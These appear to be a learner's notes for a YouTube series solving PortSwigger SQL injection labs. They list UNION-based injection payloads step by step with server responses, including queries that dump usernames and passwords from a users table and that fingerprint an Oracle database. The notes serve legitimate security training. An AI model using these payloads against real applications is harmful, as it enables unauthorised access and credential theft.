

Episode3- YouTube Channel AcronProject
    Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
        Lab: SQL injection UNION attack, determining the number of columns returned by the query
            Solution
            1- Use Burp Suite to intercept and modify the request that sets the product category filter.

            2- Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.

            3- Modify the category parameter to add an additional column containing a null value:
                
                '+UNION+SELECT+NULL,NULL--
            
            4- Continue adding null values until the error disappears and the response includes additional content containing the null values.

-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------


Episode4- YouTube Channel AcronProject
    Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
        Lab: SQL injection UNION attack, finding a column containing text
            Solution
            1- Use Burp Suite to intercept and modify the request that sets the product category filter.

            2- Determine the number of columns that are being returned by the query. 
            Verify that the query is returning three columns, using the following payload in the category parameter:
                '+UNION+SELECT+NULL,NULL,NULL--

            3- Try replacing each null with the random value provided by the lab, for example:
                
                '+UNION+SELECT+'pvheib',NULL,NULL--

                '+UNION+SELECT+NULL,'GnzPjV',NULL--

                '+UNION+SELECT+NULL,NULL,'GnzPjV'--

            4- If an error occurs, move on to the next null and try that instead.
-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------

Episode5- YouTube Channel AcronProject:
    BurpSuite Installation on Ubuntu 22.04.2 LTS


-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------

Episode6- YouTube Channel AcronProject
    Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
        Lab: SQL injection UNION attack, retrieving data from other tables
        My Solution:
            #1 Detection + All the commands used = 
                1- '                     =Internal Server Error
                2- '--                   =print it on browser ----------> '-- 
                3- 'UNION--                    =Internal Server Error
                4- 'UNION+--                   =Internal Server Error
                5- 'UNION+select--             =Internal Server Error
                6- 'UNION+SELECT--             =Internal Server Error
                7- '+UNION+SELECT+NULL--       =Internal Server Error
                8- '+UNION+SELECT+NULL,+NULL--          =print it on browser ----> ' UNION SELECT NULL, NULL--
                9- '+UNION+SELECT+'teststr1',+NULL--    =print it on browser ----> teststr1 => first column is string type
                10- '+UNION+SELECT+'teststr1',+'str2'-- =print it on browser ----> Title=teststr1 Text=str2
                11- '+UNION+SELECT+username,+password--             =Internal Server Error
                12- '+UNION+SELECT+username,+password+FROM--        =Internal Server Error
                13- '+UNION+SELECT+username,+password+FROM+*--      =Internal Server Error
                14- '+UNION+SELECT+username,+password+FROM+users--  =Result is below
                
                                                              Title administrator
                                                              Text  3b5dzxercricfvvfkayv

                                                              Title carlos
                                                              Text  1v84t9j2aq7no05z3ynf

                                                              Title wiener
                                                              Text  i15jf4sqi64yd4xhwuw7
                15- Login with administrator and password
            


            #2 Exploit with Peyload OR Peyloads!!!
                2- '--                   =print it on browser ----------> '-- 

                8- '+UNION+SELECT+NULL,+NULL--          =print it on browser ----> ' UNION SELECT NULL, NULL--

                14- '+UNION+SELECT+username,+password+FROM+users--  =Result is below
                
                                                              Title administrator
                                                              Text  3b5dzxercricfvvfkayv

                                                              Title carlos
                                                              Text  1v84t9j2aq7no05z3ynf

                                                              Title wiener
                                                              Text  i15jf4sqi64yd4xhwuw7


        Solution
        1- Use Burp Suite to intercept and modify the request that sets the product category filter.

        2- Determine the number of columns that are being returned by the query and which columns contain text data. 
        Verify that the query is returning two columns, 
        both of which contain text, using a payload like the following in the category parameter:
        
            '+UNION+SELECT+'abc','def'--

        3- Use the following payload to retrieve the contents of the users table:
        
            '+UNION+SELECT+username,+password+FROM+users--
        
        4- Verify that the application's response contains usernames and passwords.

-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------



Episode7- YouTube Channel AcronProject:
    Retrieving multiple values within a single column:
        In the preceding example, suppose instead that the query only returns a single column.
        You can easily retrieve multiple values together within this single column by concatenating the values together, 
        ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
            ' UNION SELECT username || '~' || password FROM users--
        This uses the double-pipe sequence || which is a string concatenation operator on Oracle. 
        The injected query concatenates together the values of the username and password fields, separated by the ~ character.
        The results from the query will let you read all of the usernames and passwords, for example:
            ...
            administrator~s3cure
            wiener~peter
            carlos~montoya
            ...
        Note that different databases use different syntax to perform string concatenation. For more details, see the SQL injection cheat sheet. 
            Source cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
    --------------------------------------------------------------------------------------------------------------------------------------------------
    Lab: SQL injection UNION attack, retrieving multiple values in a single column:
            Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
                My Solution:
                #1 Detection + All the commands used = 
                    1- '     => SELECT category = '''  = Error = probably vulnerable
                    2- ''    => SELECT category = '''' => 
                    3- '+UNION+SELECT+NULL,'abc'-- => SELECT category = ''+UNION+SELECT+NULL,'abc'-- = print in browser = probably vulnerable 
                                                                                                   = secend column is string
                    4- '+UNION+SELECT+'abc',NULL-- => SELECT category = '+UNION+SELECT+'abc',NULL--  = first column is probably string
                    '+UNION+SELECT+123,NULL--
                    5- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
                                                => SELECT category = '+UNION+SELECT+NULL,"username~password"--
                                                                                                    = get the usernames and password so this is vulnerable

-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------


Episode8- YouTube Channel AcronProject:
    Title:
        Lab: SQL injection attack, querying the database type and version on Oracle
    Source:
        https://portswigger.net/web-security/sql-injection/examining-the-database

    Lab:
        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

    Detection Black Box :    @@version  OR v$version OR version() 
        1- '
        2- ''
            Result: 1 != 2 ---> SQLi probably

        3- '+UNION+SELECT+NULL+FROM+v$version--      
        4- '+UNION+SELECT+NULL,+NULL+FROM+v$version--
            Result: 3 != 4 ---> Two columns probably              
                                and
                                is Oracle Because --> SELECT * FROM v$version 
                                                                    ---------
                            
        5- '+UNION+SELECT+'string',+NULL+FROM+v$version--
            Result: Show in browser => first column is string

        6- '+UNION+SELECT+'string',+'string2'+FROM+v$version--
            Result: Show in browser => secend column is string
        
        7- '+UNION+SELECT+banner,+NULL+FROM+v$version--

        





